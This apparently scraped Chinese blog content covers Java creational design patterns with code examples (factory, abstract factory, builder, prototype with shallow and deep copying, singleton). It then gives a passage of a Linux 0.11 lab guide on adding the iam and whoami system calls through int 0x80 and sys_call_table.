简单工厂模式的最大优点在于工厂类中包含了必要的逻辑判断，根据客户端的选择条件动态实例化相关的类，对于客户端来说，去除了与具体产品的依赖。就像计算器，让客户端不用管该用哪个类的实例，只需要把“+”给工厂，工厂自动就给出了相应的实例，客户端只要去做运算就可以了，不同的实例会实现不同的运算。但问题是，如果要加一个“求M数的N次方”的功能，我们是一定需要给运算工厂类的方法里加“Case”的分支条件的，修改原有的类，这就等于说，不但对扩展开放了，对修改也开放了，这样就违背了开放-封闭原则，于是工厂方法就来了。\n工厂方法模式（Factory Method），定义一个用于创建对象的接口，让子类决定实例化哪个类。工厂方法使一个类的实例化延迟到其子类。\n根据依赖倒转原则，把工厂类抽象出一个接口，这个接口只有一个方法，就是创建抽象产品的工厂方法。然后，所有的要生产具体类的工厂去实现这个接口，这样，一个简单工厂模式的工厂类，变成了一个工厂抽象接口和多个具体生成对象的工厂。要增加“求M数的N次方”的功能时，就不需要更改原有的工厂类了，只需要增加此功能的运算类和相应的工厂类就可以了。\n结构图 工厂方法模式实现 抽象工厂\n1 2 3 public interface IFactory { IOperation createOperation(); } 工厂具体实现类\n1 2 3 4 5 6 public class AddOpFactory implements IFactory{ @Override public IOperation createOperation() { return new AddOperation(); } } 1 2 3 4 5 6 public class MultiOpFactory implements IFactory{ @Override public IOperation createOperation() { return new MultiOperation(); } } 运算类\n1 2 3 public interface IOperation { double getResult(double a, double b); } 运算具体实现类\n1 2 3 4 5 6 public class AddOperation implements IOperation { @Override public double getResult(double a, double b) { return a + b; } } 1 2 3 4 5 6 public class MultiOperation implements IOperation { @Override public double getResult(double a, double b) { return a * b; } } 主函数\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 public class FactoryMethodTest { public static void main(String[] args) { System.out.println(test(\u0026#34;add\u0026#34;, 1, 2)); System.out.println(test(\u0026#34;multi\u0026#34;, 1, 2)); } public static double test(String op, double a, double b){ IOperation operation = null; switch (op){ case \u0026#34;add\u0026#34;:{ operation = (new AddOpFactory()).createOperation(); break; } case \u0026#34;multi\u0026#34;:{ operation = (new MultiOpFactory()).createOperation(); break; } } return operation.getResult(a,b); } } 抽象工厂模式——访问数据库 抽象工厂模式（Abstract Factory)，提供一个创建一系列相关或相互依赖对象的接口，而无需指定它们具体的类。\n结构图 AbstractProductA和AbstractProductB是两个抽象产品，之所以为抽象，是因为它们都有可能有两种不同的实现，拿例子来说就是User和Department，而 ProductA1、ProductA2和ProductB1、ProductB2 就是对两个抽象产品的具体分类的实现，比如 ProductA1可以理解为是SqlserverUser，而ProductB1是AccessUser。\n**IFactory是一个抽象工厂接口，它里面应该包含所有的产品创建的抽象方法。而ConcreteFactory1和ConcreteFactory2就是具体的工厂了。**就像SqlserverFactory和 AccessFactory一样。\n通常是在运行时刻再创建一个ConcreteFactory类的实例，这个具体的工厂再创建具有特定实现的产品对象，也就是说，为创建不同的产品对象，客户端应使用不同的具体工厂。\n用反射+抽象工厂实现数据访问 DataAccess类，用反射技术，取代IFactory、SqlserverFactory和 AccessFactory。\n代码实现 IUser\n1 2 3 4 public interface IUser { void insert(User user); void get(String id); } IDepartment\n1 2 3 4 public interface IDepartment { void insert(Department department); void get(String id); } SqlserverUser\n1 2 3 4 5 6 7 8 9 10 11 public class SqlserverUser implements IUser{ @Override public void insert(User user) { System.out.println(\u0026#34;sqlserver user insert\u0026#34;); } @Override public void get(String id) { System.out.println(\u0026#34;sqlserver user get\u0026#34;); } } MongoDBUser\n1 2 3 4 5 6 7 8 9 10 11 public class MongoDBUser implements IUser{ @Override public void insert(User user) { System.out.println(\u0026#34;MongoDB user insert\u0026#34;); } @Override public void get(String id) { System.out.println(\u0026#34;MongoDB user get\u0026#34;); } } SqlserverDepartment\n1 2 3 4 5 6 7 8 9 10 11 public class SqlserverDepartment implements IDepartment{ @Override public void insert(Department department) { System.out.println(\u0026#34;sqlserver department insert\u0026#34;); } @Override public void get(String id) { System.out.println(\u0026#34;sqlserver department get\u0026#34;); } } MongoDBDepartment\n1 2 3 4 5 6 7 8 9 10 11 public class MongoDBDepartment implements IDepartment{ @Override public void insert(Department department) { System.out.println(\u0026#34;MongoDB department insert\u0026#34;); } @Override public void get(String id) { System.out.println(\u0026#34;MongoDB department get\u0026#34;); } } DataAccess\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 public class DBAccess { private String db; public IUser createUser() throws ClassNotFoundException, InstantiationException, IllegalAccessException { //反射 Class.forName(\u0026#34;test.bin.abstractFactory.MongoDBUser\u0026#34;) return (IUser) Class.forName(\u0026#34;test.bin.abstractFactory.\u0026#34; + db + \u0026#34;User\u0026#34;).newInstance(); } public IDepartment createDepartment() throws ClassNotFoundException, InstantiationException, IllegalAccessException{ return (IDepartment) Class.forName(\u0026#34;test.bin.abstractFactory.\u0026#34; + db + \u0026#34;Department\u0026#34;).newInstance(); } public void setDb(String db) { this.db = db; } } main\n1 2 3 4 5 6 7 8 9 10 public class AbstractFactory { public static void main(String[] args) throws ClassNotFoundException, InstantiationException, IllegalAccessException { DBAccess dbAccess = new DBAccess(); dbAccess.setDb(\u0026#34;Sqlserver\u0026#34;); IUser user = dbAccess.createUser(); IDepartment department = dbAccess.createDepartment(); user.get(\u0026#34;1\u0026#34;); department.get(\u0026#34;1\u0026#34;); } } 通过配置文件读取配置 db.properties\n1 db = MongoDB main\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 public class AbstractFactory { public static void main(String[] args) throws ClassNotFoundException, InstantiationException, IllegalAccessException, IOException { //通过配置文件读取访问的数据库 Properties properties = new Properties(); ClassLoader classLoader = AbstractFactory.class.getClassLoader(); // 使用FileInputStream读取配置文件，文件默认在当前的module下 // FileInputStream fis = new FileInputStream(\u0026#34;src\\\\test\\\\bin\\\\abstractFactory\\\\db.properties\u0026#34;); // 使用ClassLoader读取配置文件，配置文件默认识别为：当前module的src下 InputStream is = classLoader.getResourceAsStream(\u0026#34;test\\\\bin\\\\abstractFactory\\\\db.properties\u0026#34;); properties.load(is); String db = properties.getProperty(\u0026#34;db\u0026#34;); DBAccess dbAccess = new DBAccess(); dbAccess.setDb(db); IUser user = dbAccess.createUser(); IDepartment department = dbAccess.createDepartment(); user.get(\u0026#34;1\u0026#34;); department.get(\u0026#34;1\u0026#34;); } } 建造者模式——创建小人 建造者模式（Builder)，将一个复杂对象的构建与它的表示分离，使得同样的构建过程可以创建不同的表示。\n建造者模式实现 PersonBuilder\n1 2 3 4 5 6 public interface PersonBuilder { void buildHead(); void buildArms(); void buildBody(); void buildLegs(); } PersonConcrete\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 public class PersonOneBuilder implements PersonBuilder{ @Override public void buildHead() { System.out.println(\u0026#34;buildHead 1\u0026#34;); } @Override public void buildArms() { System.out.println(\u0026#34;buildArms 1\u0026#34;); } @Override public void buildBody() { System.out.println(\u0026#34;buildBody 1\u0026#34;); } @Override public void buildLegs() { System.out.println(\u0026#34;buildLegs 1\u0026#34;); } } 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 public class PersonTwoBuilder implements PersonBuilder{ @Override public void buildHead() { System.out.println(\u0026#34;buildHead 2\u0026#34;); } @Override public void buildArms() { System.out.println(\u0026#34;buildArms 2\u0026#34;); } @Override public void buildBody() { System.out.println(\u0026#34;buildBody 2\u0026#34;); } @Override public void buildLegs() { System.out.println(\u0026#34;buildLegs 2\u0026#34;); } } PersonDirector\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 public class Director { private PersonBuilder personBuilder; public Director(PersonBuilder personBuilder) { this.personBuilder = personBuilder; } public void build(){ personBuilder.buildHead(); personBuilder.buildBody(); personBuilder.buildArms(); personBuilder.buildLegs(); } } main\n1 2 3 4 5 6 7 8 public class Test { public static void main(String[] args) { Director directorOne = new Director(new PersonOneBuilder()); Director directorTwo = new Director(new PersonTwoBuilder()); directorOne.build(); directorTwo.build(); } } 建造者模式解析 Builder是为创建一个 Product对象的各个部件指定的抽象接口。\nConcreteBuilder是具体建造者，实现 Builder 接口，构造和装配各个部件。\nProduct是具体的产品角色。\nDirector是指挥者，构建一个使用Builder接口的对象，用来根据用户的需求构建Product。\n何时使用建造者模式 主要是用于创建一些复杂的对象，这些对象内部构建间的建造顺序通常是稳定的，但对象内部的构建通常面临着复杂的变化。\n建造者模式的好处就是使得建造代码与表示代码分离，由于建造者隐藏了该产品是如何组装的，所以若需要改变一个产品的内部表示，只需要再定义一个具体的建造者就可以了。\n代码改造 Product\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 public class Person { List\u0026lt;String\u0026gt; parts = new ArrayList\u0026lt;\u0026gt;(); public void add(String part){ parts.add(part); } @Override public String toString() { return \u0026#34;Person{\u0026#34; + \u0026#34;parts=\u0026#34; + parts + \u0026#39;}\u0026#39;; } } Builder\n1 2 3 4 5 6 public interface PersonBuilder { void buildHead(); void buildArms(); void buildBody(); void buildLegs(); } ConcreteBuilder\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 public class PersonOneBuilder implements PersonBuilder{ private Person person = new Person(); @Override public void buildHead() { person.add(\u0026#34;buildHead 1\u0026#34;); } @Override public void buildArms() { person.add(\u0026#34;buildArms 1\u0026#34;); } @Override public void buildBody() { person.add(\u0026#34;buildBody 1\u0026#34;); } @Override public void buildLegs() { person.add(\u0026#34;buildLegs 1\u0026#34;); } public Person getPerson() { return person; } } 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 public class PersonTwoBuilder implements PersonBuilder{ private Person person = new Person(); @Override public void buildHead() { person.add(\u0026#34;buildHead 2\u0026#34;); } @Override public void buildArms() { person.add(\u0026#34;buildArms 2\u0026#34;); } @Override public void buildBody() { person.add(\u0026#34;buildBody 2\u0026#34;); } @Override public void buildLegs() { person.add(\u0026#34;buildLegs 2\u0026#34;); } public Person getPerson() { return person; } } Derector\n1 2 3 4 5 6 7 8 9 public class Director { public void construct(PersonBuilder personBuilder) { personBuilder.buildHead(); personBuilder.buildBody(); personBuilder.buildArms(); personBuilder.buildLegs(); } } main\n1 2 3 4 5 6 7 8 9 10 11 public class Test { public static void main(String[] args) { PersonOneBuilder personOneBuilder = new PersonOneBuilder(); PersonTwoBuilder personTwoBuilder = new PersonTwoBuilder(); Director director = new Director(); director.construct(personOneBuilder); director.construct(personTwoBuilder); System.out.println(personOneBuilder.getPerson()); System.out.println(personTwoBuilder.getPerson()); } } 原型模式——简历复印 原型模式（Prototype)，用原型实例指定创建对象的种类，并且通过拷贝这些原型创建新的对象。\n原型模式其实就是从一个对象再创建另外一个可定制的对象，而且不需知道任何创建的细节\n结构图 实现对象拷贝（浅拷贝）的类，需要实现 Cloneable 接口，并重写 clone() 方法\n原型模式实现 简历类\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 public class Resume implements Cloneable{ private String name; private int age; private Company company; @Override public Resume clone() { try { Resume clone = (Resume) super.clone(); return clone; } catch (CloneNotSupportedException e) { throw new AssertionError(); } } ... // get set toString } 公司类\n1 2 3 4 5 6 public class Company { private String name; private String address; ... // get set toString } 主函数\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 public class PrototypeTest { public static void main(String[] args) throws CloneNotSupportedException { Resume resume = new Resume(\u0026#34;张三\u0026#34;, 18); Company company = new Company(\u0026#34;字节\u0026#34;,\u0026#34;eimeng\u0026#34;); resume.setCompany(company); Resume resume1 = resume.clone(); resume1.setAge(19); Resume resume2 = resume.clone(); resume.setName(\u0026#34;李四\u0026#34;); resume.setAge(20); company.setName(\u0026#34;高德\u0026#34;); System.out.println(resume); System.out.println(resume1); System.out.println(resume2); //Resume{name=\u0026#39;李四\u0026#39;, age=20, company=Company{name=\u0026#39;高德\u0026#39;, address=\u0026#39;eimeng\u0026#39;}} //Resume{name=\u0026#39;张三\u0026#39;, age=19, company=Company{name=\u0026#39;高德\u0026#39;, address=\u0026#39;eimeng\u0026#39;}} //Resume{name=\u0026#39;张三\u0026#39;, age=18, company=Company{name=\u0026#39;高德\u0026#39;, address=\u0026#39;eimeng\u0026#39;}} } } 从上面的日志中可以发现，在拷贝过后，更改resume的name和age时，拷贝的resume1和resume2相应字段没有发生改变，但是更改company对象的name属性时三个实例的company都变成了最后一次设置的值，这是为什么呢？这其实是因为浅拷贝和深拷贝的原因。\n浅拷贝和深拷贝 https://www.jianshu.com/p/94dbef2de298\nhttps://www.cnblogs.com/shakinghead/p/7651502.html\n浅拷贝 浅拷贝是按位拷贝对象，它会创建一个新对象，这个对象有着原始对象属性值的一份精确拷贝。如果属性是基本类型，拷贝的就是基本类型的值；如果属性是内存地址（引用类型），拷贝的就是内存地址 ，因此如果其中一个对象改变了这个地址，就会影响到另一个对象。即默认拷贝构造函数只是对对象进行浅拷贝复制(逐个成员依次拷贝)，即只复制对象空间而不复制资源。\n浅拷贝特点\n(1) 对于基本数据类型的成员对象，因为基础数据类型是值传递的，所以是直接将属性值赋值给新的对象。基础类型的拷贝，其中一个对象修改该值，不会影响另外一个。 (2) 对于引用类型，比如数组或者类对象，因为引用类型是引用传递，所以浅拷贝只是把内存地址赋值给了成员变量，它们指向了同一内存空间。改变其中一个，会对另外一个也产生影响。\n分析打印结果\n基本数据类型是值传递，所以修改值后不会影响另一个对象的该属性值；\n引用数据类型是地址传递（引用传递），所以修改值后另一个对象的该属性值会同步被修改。\nString类型非常特殊，首先，String类型属于引用数据类型，不属于基本数据类型，但是String类型的数据是存放在常量池中的，也就是无法修改的！也就是说，当我将name属性从“张三”改为“李四\u0026quot;后，并不是修改了这个数据的值，而是把这个数据的引用从指向”张三“这个常量改为了指向”李四“这个常量。在这种情况下，另一个对象的name属性值仍然指向”张三“不会受到影响。\n通过上面的例子可以看到，浅拷贝会带来数据安全方面的隐患，例如只是想修改 resume 的 company，但是另外两个实例的 company 也被修改了，因为它们都是指向的同一个地址。所以，此种情况下，需要用到深拷贝。\n深拷贝 首先介绍对象图的概念。设想一下，一个类有一个对象，其成员变量中又有一个对象，该对象指向另一个对象，另一个对象又指向另一个对象，直到一个确定的实例。这就形成了对象图。那么，对于深拷贝来说，不仅要复制对象的所有基本数据类型的成员变量值，还要为所有引用数据类型的成员变量申请存储空间，并复制每个引用数据类型成员变量所引用的对象，直到该对象可达的所有对象。也就是说，对象进行深拷贝要对整个对象图进行拷贝！\n简单地说，深拷贝对引用数据类型的成员变量的对象图中所有的对象都开辟了内存空间；而浅拷贝只是传递地址指向，新的对象并没有对引用数据类型创建内存空间。\n因为创建内存空间和拷贝整个对象图，所以深拷贝相比于浅拷贝速度较慢并且花销较大。\n深拷贝的实现方法主要有两种：\n一、通过重写clone方法来实现深拷贝\n与通过重写clone方法实现浅拷贝的基本思路一样，只需要为对象图的每一层的每一个对象都实现Cloneable接口并重写clone方法，最后在最顶层的类的重写的clone方法中调用所有的clone方法即可实现深拷贝。简单的说就是：每一层的每个对象都进行浅拷贝=深拷贝。\n简历类\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 public class Resume implements Cloneable{ private String name; private int age; private Company company; @Override public Resume clone() { try { Resume clone = (Resume) super.clone(); // 简历类实例的company对象属性，调用其clone方法进行拷贝 clone.company = clone.getCompany().clone(); return clone; } catch (CloneNotSupportedException e) { throw new AssertionError(); } } ... // get set toString } 公司类\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 public class Company { private String name; private String address; @Override public Company clone() implements Cloneable{ try { return (Company) super.clone(); } catch (CloneNotSupportedException e) { throw new AssertionError(); } } ... // get set toString } 主函数\n1 2 3 4 5 6 7 8 //主函数不变 //输出结果如下 System.out.println(resume); System.out.println(resume1); System.out.println(resume2); // Resume{name=\u0026#39;李四\u0026#39;, age=20, company=Company{name=\u0026#39;高德\u0026#39;, address=\u0026#39;eimeng\u0026#39;}} // Resume{name=\u0026#39;张三\u0026#39;, age=19, company=Company{name=\u0026#39;字节\u0026#39;, address=\u0026#39;eimeng\u0026#39;}} // Resume{name=\u0026#39;张三\u0026#39;, age=18, company=Company{name=\u0026#39;字节\u0026#39;, address=\u0026#39;eimeng\u0026#39;}} 进行了深拷贝之后，无论是什么类型的属性值的修改，都不会影响另一个对象的属性值。\n二、通过对象序列化实现深拷贝\n虽然层次调用clone方法可以实现深拷贝，但是显然代码量实在太大。特别对于属性数量比较多、层次比较深的类而言，每个类都要重写clone方法太过繁琐。\n将对象序列化为字节序列后，默认会将该对象的整个对象图进行序列化，再通过反序列即可完美地实现深拷贝。\n简历类\n1 2 3 4 5 6 7 public class ResumeSerializable implements Serializable { private String name; private int age; private CompanySerializable company; ... // get set toString } 公司类\n1 2 3 4 5 6 public class CompanySerializable implements Serializable { private String name; private String address; ... // get set toString } 测试类\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 public static void test2() throws IOException, ClassNotFoundException { ResumeSerializable resume = new ResumeSerializable(\u0026#34;张三\u0026#34;, 18); CompanySerializable company = new CompanySerializable(\u0026#34;字节\u0026#34;,\u0026#34;eimeng\u0026#34;); resume.setCompany(company); //通过序列化方法实现深拷贝 ByteArrayOutputStream bos=new ByteArrayOutputStream(); ObjectOutputStream oos=new ObjectOutputStream(bos); oos.writeObject(resume); oos.flush(); ObjectInputStream ois=new ObjectInputStream(new ByteArrayInputStream(bos.toByteArray())); ResumeSerializable resume1=(ResumeSerializable)ois.readObject(); resume1.setAge(19); resume.setName(\u0026#34;李四\u0026#34;); resume.setAge(20); company.setName(\u0026#34;高德\u0026#34;); System.out.println(resume); System.out.println(resume1); // Resume{name=\u0026#39;李四\u0026#39;, age=20, company=Company{name=\u0026#39;高德\u0026#39;, address=\u0026#39;eimeng\u0026#39;}} // Resume{name=\u0026#39;张三\u0026#39;, age=19, company=Company{name=\u0026#39;字节\u0026#39;, address=\u0026#39;eimeng\u0026#39;}} } 单例模式——生娃 单例模式（Singleton)，保证一个类仅有一个实例，并提供一个访问它的全局访问点。\n通常我们可以让一个全局变量使得一个对象被访问，但它不能防止你实例化多个对象。一个最好的办法就是，让类自身负责保存它的唯一实例。这个类可以保证没有其他实例可以被创建，并且它可以提供一个访问该实例的方法。\n应用场景 网站的计数器，一般也是单例模式实现，否则难以同步。\n应用程序的日志应用，一般都使用单例模式实现，这一般是由于共享的日志文件一直处于打开状态，因为只能有一个实例去操作，否则内容不好追加。数据库连接池的设计一般也是采用单例模式，因为数据库连接是一种数据库资源。\n项目中，读取配置文件的类，一般也只有一个对象。没有必要每次使用配置文件数据，都生成一个对象去读取。\nApplication 也是单例的典型应用\nWindows的Task Manager (任务管理器)就是很典型的单例模式\nWindows的Recycle Bin(回收站)也是典型的单例应用。在整个系统运行过程中，回收站一直维护着仅有的一个实例。\n代码实现 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 /* * 单例设计模式： * 1. 所谓类的单例设计模式，就是采取一定的方法保证在整个的软件系统中，对某个类只能存在一个对象实例。 * * 2. 如何实现？ * 饿汉式 vs 懒汉式 * * 3. 区分饿汉式 和 懒汉式 * 饿汉式：\t* 坏处：对象加载时间过长。 * 好处：饿汉式是线程安全的 * * 懒汉式：好处：延迟对象的创建。 * 目前的写法坏处：线程不安全。---\u0026gt;到多线程内容时，再修改 * */ public class SingletonTest1 { public static void main(String[] args) { //\tBank bank1 = new Bank(); //\tBank bank2 = new Bank(); Bank bank1 = Bank.getInstance(); Bank bank2 = Bank.getInstance(); System.out.println(bank1 == bank2); } } //饿汉式 class Bank{ //1.私有化类的构造器 private Bank(){ } //2.内部创建类的对象 //4.要求此对象也必须声明为静态的 private static Bank instance = new Bank(); //3.提供公共的静态的方法，返回类的对象 public static Bank getInstance(){ return instance; } } 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 /* * 单例模式的懒汉式实现 * */ public class SingletonTest2 { public static void main(String[] args) { Order order1 = Order.getInstance(); Order order2 = Order.getInstance(); System.out.println(order1 == order2); } } class Order{ //1.私有化类的构造器 private Order(){ } //2.声明当前类对象，没有初始化 //4.此对象也必须声明为static的 private static Order instance = null; //3.声明public、static的返回当前类对象的方法 public static Order getInstance(){ if(instance == null){ instance = new Order(); } return instance; } } 使用同步机制将单例模式中的懒汉式改写为线程安全的\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 class Bank{ private Bank(){} private static Bank instance = null; public static Bank getInstance(){ //方式一：效率稍差 // synchronized (Bank.class) { // if(instance == null){ // // instance = new Bank(); // } // return instance; // } //方式二：效率更高 if(instance == null){ synchronized (Bank.class) { if(instance == null){ instance = new Bank(); } } } return instance; } } ","permalink":"https://chance7bin.github.io/posts/basic/pattern/%E5%88%9B%E5%BB%BA%E5%9E%8B%E6%A8%A1%E5%BC%8F/","summary":"简单工厂模式——计算器 结构图 简单工厂模式实现 运算接口（父类） 1 2 3 public interface IOperation { double getResult(double a, double b); } 创建两个运算符类实现该接口 1 2 3 4 5 6 7 8 public class AddOperation implements IOperation {","title":"创建型模式"},{"content":"1. 实验目的 建立对系统调用接口的深入认识； 掌握系统调用的基本过程； 能完成系统调用的全面控制； 为后续实验做准备。 2. 实验内容 此次实验的基本内容是：在 Linux 0.11 上添加两个系统调用，并编写两个简单的应用程序测试它们。\n（1）iam() 第一个系统调用是 iam()，其原型为：\n1 int iam(const char * name); 完成的功能是将字符串参数 name 的内容拷贝到内核中保存下来。要求 name 的长度不能超过 23 个字符。返回值是拷贝的字符数。如果 name 的字符个数超过了 23，则返回 “-1”，并置 errno 为 EINVAL。\n在 kernal/who.c 中实现此系统调用。\n（2）whoami() 第二个系统调用是 whoami()，其原型为：\n1 int whoami(char* name, unsigned int size); 它将内核中由 iam() 保存的名字拷贝到 name 指向的用户地址空间中，同时确保不会对 name 越界访存（name 的大小由 size 说明）。返回值是拷贝的字符数。如果 size 小于需要的空间，则返回“-1”，并置 errno 为 EINVAL。\n也是在 kernal/who.c 中实现。\n（3）测试程序 运行添加过新系统调用的 Linux 0.11，在其环境下编写两个测试程序 iam.c 和 whoami.c。最终的运行结果是：\n1 2 3 4 5 $ ./iam lizhijun $ ./whoami lizhijun 3. 实验报告 在实验报告中回答如下问题：\n从 Linux 0.11 现在的机制看，它的系统调用最多能传递几个参数？你能想出办法来扩大这个限制吗？ 用文字简要描述向 Linux 0.11 添加一个系统调用 foo() 的步骤。 4. 实验提示 首先，请将 Linux 0.11 的源代码恢复到原始状态。\n1 2 3 4 5 6 # 删除原来的文件 $ cd ~/oslab $ sudo rm -rf ./* # 重新拷贝 $ cp -r /home/teacher/oslab/* ./ 操作系统实现系统调用的基本过程（在 MOOC 课程中已经给出了详细的讲解）是：\n应用程序调用库函数（API）； API 将系统调用号存入 EAX，然后通过中断调用使系统进入内核态； 内核中的中断处理函数根据系统调用号，调用对应的内核函数（系统调用）； 系统调用完成相应功能，将返回值存入 EAX，返回到中断处理函数； 中断处理函数返回到 API 中； API 将 EAX 返回给应用程序。 4.1 应用程序如何调用系统调用 在通常情况下，调用系统调用和调用一个普通的自定义函数在代码上并没有什么区别，但调用后发生的事情有很大不同。\n调用自定义函数是通过 call 指令直接跳转到该函数的地址，继续运行。\n而调用系统调用，是调用系统库中为该系统调用编写的一个接口函数，叫 API（Application Programming Interface）。API 并不能完成系统调用的真正功能，它要做的是去调用真正的系统调用，过程是：\n把系统调用的编号存入 EAX； 把函数参数存入其它通用寄存器； 触发 0x80 号中断（int 0x80）。 linux-0.11 的 lib 目录下有一些已经实现的 API。Linus 编写它们的原因是在内核加载完毕后，会切换到用户模式下，做一些初始化工作，然后启动 shell。而用户模式下的很多工作需要依赖一些系统调用才能完成，因此在内核中实现了这些系统调用的 API。\n后面的目录如果没有特殊说明，都是指在 /home/shiyanlou/oslab/linux-0.11 中。比如下面的 lib/close.c，是指 /home/shiyanlou/oslab/linux-0.11/lib/close.c。\n我们不妨看看 lib/close.c，研究一下 close() 的 API：\n1 2 3 4 #define __LIBRARY__ #include \u0026lt;unistd.h\u0026gt; _syscall1(int, close, int, fd) 其中 _syscall1 是一个宏，在 include/unistd.h 中定义。\n1 2 3 4 5 6 7 8 9 10 11 12 #define _syscall1(type,name,atype,a) \\ type name(atype a) \\ { \\ long __res; \\ __asm__ volatile (\u0026#34;int $0x80\u0026#34; \\ : \u0026#34;=a\u0026#34; (__res) \\ : \u0026#34;0\u0026#34; (__NR_##name),\u0026#34;b\u0026#34; ((long)(a))); \\ if (__res \u0026gt;= 0) \\ return (type) __res; \\ errno = -__res; \\ return -1; \\ } 将 _syscall1(int,close,int,fd) 进行宏展开，可以得到：\n1 2 3 4 5 6 7 8 9 10 11 int close(int fd) { long __res; __asm__ volatile (\u0026#34;int $0x80\u0026#34; : \u0026#34;=a\u0026#34; (__res) : \u0026#34;0\u0026#34; (__NR_close),\u0026#34;b\u0026#34; ((long)(fd))); if (__res \u0026gt;= 0) return (int) __res; errno = -__res; return -1; } 这就是 API 的定义。它先将宏 __NR_close 存入 EAX，将参数 fd 存入 EBX，然后进行 0x80 中断调用。调用返回后，从 EAX 取出返回值，存入 __res，再通过对 __res 的判断决定传给 API 的调用者什么样的返回值。\n其中 __NR_close 就是系统调用的编号，在 include/unistd.h 中定义：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 #define __NR_close 6 /* 所以添加系统调用时需要修改include/unistd.h文件， 使其包含__NR_whoami和__NR_iam。 */ /* 而在应用程序中，要有： */ /* 有它，_syscall1 等才有效。详见unistd.h */ #define __LIBRARY__ /* 有它，编译器才能获知自定义的系统调用的编号 */ #include \u0026#34;unistd.h\u0026#34; /* iam()在用户空间的接口函数 */ _syscall1(int, iam, const char*, name); /* whoami()在用户空间的接口函数 */ _syscall2(int, whoami,char*,name,unsigned int,size); 在 0.11 环境下编译 C 程序，包含的头文件都在 /usr/include 目录下。\n该目录下的 unistd.h 是标准头文件（它和 0.11 源码树中的 unistd.h 并不是同一个文件，虽然内容可能相同），没有 __NR_whoami 和 __NR_iam 两个宏，需要手工加上它们，也可以直接从修改过的 0.11 源码树中拷贝新的 unistd.h 过来。\n4.2 从“int 0x80”进入内核函数 int 0x80 触发后，接下来就是内核的中断处理了。先了解一下 0.11 处理 0x80 号中断的过程。\n在内核初始化时，主函数（在 init/main.c 中，Linux 实验环境下是 main()，Windows 下因编译器兼容性问题被换名为 start()）调用了 sched_init() 初始化函数：\n1 2 3 4 5 6 7 8 void main(void) { // …… time_init(); sched_init(); buffer_init(buffer_memory_end); // …… } sched_init() 在 kernel/sched.c 中定义为：\n1 2 3 4 5 void sched_init(void) { // …… set_system_gate(0x80,\u0026amp;system_call); } set_system_gate 是个宏，在 include/asm/system.h 中定义为：\n1 2 #define set_system_gate(n,addr) \\ _set_gate(\u0026amp;idt[n],15,3,addr) _set_gate 的定义是：\n1 2 3 4 5 6 7 8 9 10 #define _set_gate(gate_addr,type,dpl,addr) \\ __asm__ (\u0026#34;movw %%dx,%%ax\\n\\t\u0026#34; \\ \u0026#34;movw %0,%%dx\\n\\t\u0026#34; \\ \u0026#34;movl %%eax,%1\\n\\t\u0026#34; \\ \u0026#34;movl %%edx,%2\u0026#34; \\ : \\ : \u0026#34;i\u0026#34; ((short) (0x8000+(dpl\u0026lt;\u0026lt;13)+(type\u0026lt;\u0026lt;8))), \\ \u0026#34;o\u0026#34; (*((char *) (gate_addr))), \\ \u0026#34;o\u0026#34; (*(4+(char *) (gate_addr))), \\ \u0026#34;d\u0026#34; ((char *) (addr)),\u0026#34;a\u0026#34; (0x00080000)) 虽然看起来挺麻烦，但实际上很简单，就是填写 IDT（中断描述符表），将 system_call 函数地址写到 0x80 对应的中断描述符中，也就是在中断 0x80 发生后，自动调用函数 system_call。具体细节请参考《注释》的第 4 章。\n接下来看 system_call。该函数纯汇编打造，定义在 kernel/system_call.s 中：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 !…… ! # 这是系统调用总数。如果增删了系统调用，必须做相应修改 nr_system_calls = 72 !…… .globl system_call .align 2 system_call: ! # 检查系统调用编号是否在合法范围内 cmpl \\$nr_system_calls-1,%eax ja bad_sys_call push %ds push %es push %fs pushl %edx pushl %ecx ! # push %ebx,%ecx,%edx，是传递给系统调用的参数 pushl %ebx ! # 让ds, es指向GDT，内核地址空间 movl $0x10,%edx mov %dx,%ds mov %dx,%es movl $0x17,%edx ! # 让fs指向LDT，用户地址空间 mov %dx,%fs call sys_call_table(,%eax,4) pushl %eax movl current,%eax cmpl $0,state(%eax) jne reschedule cmpl $0,counter(%eax) je reschedule system_call 用 .globl 修饰为其他函数可见。\nWindows 实验环境下会看到它有一个下划线前缀，这是不同版本编译器的特质决定的，没有实质区别。\ncall sys_call_table(,%eax,4) 之前是一些压栈保护，修改段选择子为内核段，call sys_call_table(,%eax,4) 之后是看看是否需要重新调度，这些都与本实验没有直接关系，此处只关心 call sys_call_table(,%eax,4) 这一句。\n根据汇编寻址方法它实际上是：call sys_call_table + 4 * %eax，其中 eax 中放的是系统调用号，即 __NR_xxxxxx。\n显然，sys_call_table 一定是一个函数指针数组的起始地址，它定义在 include/linux/sys.h 中：\n1 fn_ptr sys_call_table[] = { sys_setup, sys_exit, sys_fork, sys_read,... 增加实验要求的系统调用，需要在这个函数表中增加两个函数引用 ——sys_iam 和 sys_whoami。当然该函数在 sys_call_table 数组中的位置必须和 __NR_xxxxxx 